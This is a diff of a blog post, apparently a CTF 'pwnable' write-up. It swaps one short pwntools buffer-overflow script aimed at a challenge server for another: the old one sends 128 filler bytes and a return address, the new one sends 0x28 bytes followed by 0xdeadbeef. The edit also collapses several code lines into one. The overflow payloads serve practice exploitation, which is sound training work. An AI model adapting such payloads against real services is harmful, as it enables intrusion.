@@ -6,11 +6,8 @@ tag: [pwnable]
 layout: post
 ---
 
-```
-from pwn import *
+{% highlight python %} from pwn import *
 
-p = remote("ctf.j0n9hyun.xyz", 3001)
+p = remote("ctf.j0n9hyun.xyz", 3000)
 
-p.sendline("a"*128+p32(0x804849b))
-p.interactive()
-```
+p.sendline("0"*0x28+p32(0xdeadbeef)) p.interactive() {% endhighlight %}
